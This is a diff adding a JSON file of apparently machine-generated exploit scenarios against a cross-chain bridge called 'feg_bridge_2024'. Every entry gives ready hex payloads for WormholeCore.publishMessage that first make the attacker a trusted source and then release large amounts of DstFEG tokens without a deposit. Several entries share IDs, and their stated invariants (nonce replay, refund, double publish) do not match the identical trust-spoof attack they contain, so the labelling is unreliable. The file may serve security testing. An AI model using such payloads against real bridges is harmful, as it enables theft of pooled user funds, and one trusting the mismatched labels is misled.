@@ -1,0 +1,703 @@
+{
+  "bridge_name": "feg_bridge_2024",
+  "scenarios": [
+    {
+      "scenario_id": "feg_bridge_logic_bug_01",
+      "target_invariant": "asset_conservation_total_locked",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "meterio_20220205"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
+          },
+          "description": "Send OP_SET_TRUSTED message to make attacker a trusted source on the destination bridge."
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000056bc75e2d63100000"
+          },
+          "description": "Send OP_RELEASE message as a trusted source to release 100 FEG tokens from the destination bridge to attacker, violating asset conservation."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Send OP_SET_TRUSTED message to make attacker a trusted source on the destination bridge."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Send OP_RELEASE message as a trusted source to release 100 FEG tokens from the destination bridge to attacker, violating asset conservation."
+        }
+      ]
+    },
+    {
+      "scenario_id": "fegbridge_trust_exploit",
+      "target_invariant": "asset_conservation_locked_nonnegative",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "nomad_20220801",
+        "synapse_20211109",
+        "ronin_20240806",
+        "nerve_20211115",
+        "thorchain_20210723"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
+          },
+          "description": "Set attacker as a trusted source by using OP_SET_TRUSTED (op=1)."
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000d3c21bcecceda1000000"
+          },
+          "description": "Release a large amount of DstFEG to attacker using OP_RELEASE (op=2) now that attacker is trusted."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Set attacker as a trusted source by using OP_SET_TRUSTED (op=1)."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Release a large amount of DstFEG to attacker using OP_RELEASE (op=2) now that attacker is trusted."
+        }
+      ]
+    },
+    {
+      "scenario_id": "exploit_001",
+      "target_invariant": "asset_conservation_release_matches_locked",
+      "vulnerability_class": "trusted_source_spoof",
+      "confidence": 0.95,
+      "retrieved_exploits": [
+        "qubit_20220127",
+        "meterio_20220205"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
+          },
+          "description": "Mark attacker address as trusted source via OP_SET_TRUSTED message."
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000d3c21bcecceda1000000"
+          },
+          "description": "Release a large amount of DstFEG tokens to attacker from trusted source, exceeding any locked amount."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Mark attacker address as trusted source via OP_SET_TRUSTED message."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Release a large amount of DstFEG tokens to attacker from trusted source, exceeding any locked amount."
+        }
+      ]
+    },
+    {
+      "scenario_id": "exploit_001",
+      "target_invariant": "authorization_only_relayer_can_publish",
+      "vulnerability_class": "authorization",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "wormhole_20220202"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
+          },
+          "description": "Publish a message with OP_SET_TRUSTED to make the attacker address trusted on the destination bridge."
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000d3c21bcecceda1000000"
+          },
+          "description": "Publish a release message after being trusted; the relayer will forward it, causing the bridge to transfer the minted DstFEG tokens to the attacker."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Publish a message with OP_SET_TRUSTED to make the attacker address trusted on the destination bridge."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Publish a release message after being trusted; the relayer will forward it, causing the bridge to transfer the minted DstFEG tokens to the attacker."
+        }
+      ]
+    },
+    {
+      "scenario_id": "feg_bridge_trust_exploit_001",
+      "target_invariant": "authorization_release_requires_trusted_source",
+      "vulnerability_class": "authorization_logic",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "chainswap_20210711"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
+          },
+          "description": "Use OP_SET_TRUSTED to mark attacker address as a trusted source via a relayed message."
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000069e10de76676d0800000"
+          },
+          "description": "After being trusted, emit an OP_RELEASE message to withdraw 500,000 bridged tokens to attacker."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Use OP_SET_TRUSTED to mark attacker address as a trusted source via a relayed message."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "After being trusted, emit an OP_RELEASE message to withdraw 500,000 bridged tokens to attacker."
+        }
+      ]
+    },
+    {
+      "scenario_id": "exploit_missing_signature_verification",
+      "target_invariant": "authorization_release_requires_valid_signature",
+      "vulnerability_class": "logic_bug",
+      "confidence": 1.0,
+      "retrieved_exploits": [
+        "crosscurve_20260131"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
+          },
+          "description": "Publish a SET_TRUSTED message; relayer will call FEGSmartBridge.receiveMessage(attacker, payload) which sets trustedSource[attacker] = true."
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000d3c21bcecceda1000000"
+          },
+          "description": "Publish a RELEASE message from the now‑trusted attacker address; relayer will call FEGSmartBridge.receiveMessage(attacker, payload) which transfers the specified amount of DstFEG to attacker, bypassing any VAA signature verification."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Publish a SET_TRUSTED message; relayer will call FEGSmartBridge.receiveMessage(attacker, payload) which sets trustedSource[attacker] = true."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Publish a RELEASE message from the now‑trusted attacker address; relayer will call FEGSmartBridge.receiveMessage(attacker, payload) which transfers the specified amount of DstFEG to attacker, bypassing any VAA signature verification."
+        }
+      ]
+    },
+    {
+      "scenario_id": "bridge_nonce_replay_01",
+      "target_invariant": "uniqueness_nonce_used_once",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.92,
+      "retrieved_exploits": [
+        "nomad_20220801"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
+          },
+          "description": "Send a message with OP_SET_TRUSTED to make the attacker address a trusted source. The relayer forwards this to FEGSmartBridge.receiveMessage, which sets trustedSource[attacker] = true without any access check."
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000003635c9adc5dea00000"
+          },
+          "description": "After becoming trusted, publish an OP_RELEASE message releasing 1000 DstFEG to the attacker. The relayer forwards it, and FEGSmartBridge transfers the tokens from its balance, effectively minting value without a corresponding deposit, violating the nonce‑uniqueness invariant."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Send a message with OP_SET_TRUSTED to make the attacker address a trusted source. The relayer forwards this to FEGSmartBridge.receiveMessage, which sets trustedSource[attacker] = true without any access check."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "After becoming trusted, publish an OP_RELEASE message releasing 1000 DstFEG to the attacker. The relayer forwards it, and FEGSmartBridge transfers the tokens from its balance, effectively minting value without a corresponding deposit, violating the nonce‑uniqueness invariant."
+        }
+      ]
+    },
+    {
+      "scenario_id": "attack1",
+      "target_invariant": "uniqueness_message_id_consumed_once",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "wormhole_xscope"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
+          },
+          "description": "Forge a Wormhole message that sets attacker as a trusted source on the destination bridge (OP_SET_TRUSTED)."
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000d3c21bcecceda1000000"
+          },
+          "description": "Forge a Wormhole message that releases a large amount of DstFEG to attacker (OP_RELEASE) from the now‑trusted source."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Forge a Wormhole message that sets attacker as a trusted source on the destination bridge (OP_SET_TRUSTED)."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Forge a Wormhole message that releases a large amount of DstFEG to attacker (OP_RELEASE) from the now‑trusted source."
+        }
+      ]
+    },
+    {
+      "scenario_id": "feg_bridge_replay_attack",
+      "target_invariant": "uniqueness_no_replay_of_deposit",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.95,
+      "retrieved_exploits": [
+        "qubit_20220127",
+        "meterio_20220205"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
+          },
+          "description": "Set attacker as a trusted source by sending OP_SET_TRUSTED payload via WormholeCore; relayer will call FEGSmartBridge.receiveMessage with sourceAddress=attacker, which marks attacker trusted."
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000003635c9adc5dea00000"
+          },
+          "description": "Release a large amount of DstFEG to attacker using OP_RELEASE payload; relayer forwards to FEGSmartBridge which now trusts attacker, allowing transfer of tokens without a corresponding deposit."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Set attacker as a trusted source by sending OP_SET_TRUSTED payload via WormholeCore; relayer will call FEGSmartBridge.receiveMessage with sourceAddress=attacker, which marks attacker trusted."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Release a large amount of DstFEG to attacker using OP_RELEASE payload; relayer forwards to FEGSmartBridge which now trusts attacker, allowing transfer of tokens without a corresponding deposit."
+        }
+      ]
+    },
+    {
+      "scenario_id": "feg_bridge_settrusted_exploit",
+      "target_invariant": "asset_conservation_refund_restores_balance",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "thorchain_20210628",
+        "thorchain_20210629",
+        "synapse_20211109",
+        "meterio_20220205",
+        "metpassport_20220206"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
+          },
+          "description": "Use OP_SET_TRUSTED to add attacker as a trusted source."
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000003635c9adc5dea00000"
+          },
+          "description": "After becoming trusted, release arbitrary amount of DstFEG to attacker without depositing on source chain."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Use OP_SET_TRUSTED to add attacker as a trusted source."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "After becoming trusted, release arbitrary amount of DstFEG to attacker without depositing on source chain."
+        }
+      ]
+    },
+    {
+      "scenario_id": "feg_bridge_trust_exploit",
+      "target_invariant": "authorization_only_admin_can_update_trusted_source",
+      "vulnerability_class": "authorization",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "wormhole_20220202",
+        "polynetwork_20210810"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
+          },
+          "description": "Forge a cross‑chain message that sets attacker as a trusted source on the destination bridge, bypassing the admin‑only check."
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000d3c21bcecceda1000000"
+          },
+          "description": "After becoming a trusted source, publish a RELEASE message that makes the bridge transfer the full minted DstFEG balance to attacker, extracting value without any deposit."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Forge a cross‑chain message that sets attacker as a trusted source on the destination bridge, bypassing the admin‑only check."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "After becoming a trusted source, publish a RELEASE message that makes the bridge transfer the full minted DstFEG balance to attacker, extracting value without any deposit."
+        }
+      ]
+    },
+    {
+      "scenario_id": "scenario_01",
+      "target_invariant": "uniqueness_no_double_publish_for_same_nonce",
+      "vulnerability_class": "trusted_source_exploit",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "wormhole_xscope"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
+          },
+          "description": "Publish a message with OP_SET_TRUSTED to add attacker as a trusted source on the destination bridge."
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000d3c21bcecceda1000000"
+          },
+          "description": "Publish a message with OP_RELEASE to transfer the full bridge token balance to attacker after becoming trusted."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Publish a message with OP_SET_TRUSTED to add attacker as a trusted source on the destination bridge."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Publish a message with OP_RELEASE to transfer the full bridge token balance to attacker after becoming trusted."
+        }
+      ]
+    },
+    {
+      "scenario_id": "feg_bridge_logic_bug_trust_spoof",
+      "target_invariant": "asset_conservation_total_supply_unchanged_across_chains",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.97,
+      "retrieved_exploits": [
+        "metpassport_20220206",
+        "synapse_20211109",
+        "evodefi_20220607",
+        "verus_20260518",
+        "bnbbridge_20221007"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
+          },
+          "description": "Encode OP_SET_TRUSTED payload to add attacker to trustedSource mapping in FEGSmartBridge."
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000069e10de76676d0800000"
+          },
+          "description": "Encode OP_RELEASE payload to transfer 500,000 destination tokens to attacker after becoming trusted."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Encode OP_SET_TRUSTED payload to add attacker to trustedSource mapping in FEGSmartBridge."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Encode OP_RELEASE payload to transfer 500,000 destination tokens to attacker after becoming trusted."
+        }
+      ]
+    },
+    {
+      "scenario_id": "feg_bridge_trust_exploit",
+      "target_invariant": "authorization_release_requires_correct_nonce",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "nomad_20220801",
+        "metpassport_20220206",
+        "meterio_20220205",
+        "polynetwork_20210810",
+        "crosscurve_20260131"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
+          },
+          "description": "Send OP_SET_TRUSTED message to make attacker address a trusted source on the destination bridge."
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000d3c21bcecceda1000000"
+          },
+          "description": "Send OP_RELEASE message as a trusted source to withdraw all DstFEG tokens from the bridge to attacker."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Send OP_SET_TRUSTED message to make attacker address a trusted source on the destination bridge."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Send OP_RELEASE message as a trusted source to withdraw all DstFEG tokens from the bridge to attacker."
+        }
+      ]
+    },
+    {
+      "scenario_id": "feg_bridge_untrusted_source",
+      "target_invariant": "uniqueness_message_id_not_reused_after_refund",
+      "vulnerability_class": "access_control",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "thorchain_20210628",
+        "thorchain_20210629",
+        "meterio_20220205",
+        "qubit_20220127",
+        "metpassport_20220206"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000002387b3383e89c164781d173b7aa14d9c46ed26420000000000000000000000000000000000000000000000000000000000000000"
+          },
+          "description": "Send OP_SET_TRUSTED message to mark the WormholeCore contract as a trusted source on the destination bridge."
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000003635c9adc5dea00000"
+          },
+          "description": "Send OP_RELEASE message (now accepted because source is trusted) to transfer 1000 DstFEG tokens to attacker without any prior deposit."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Send OP_SET_TRUSTED message to mark the WormholeCore contract as a trusted source on the destination bridge."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Send OP_RELEASE message (now accepted because source is trusted) to transfer 1000 DstFEG tokens to attacker without any prior deposit."
+        }
+      ]
+    }
+  ]
+}
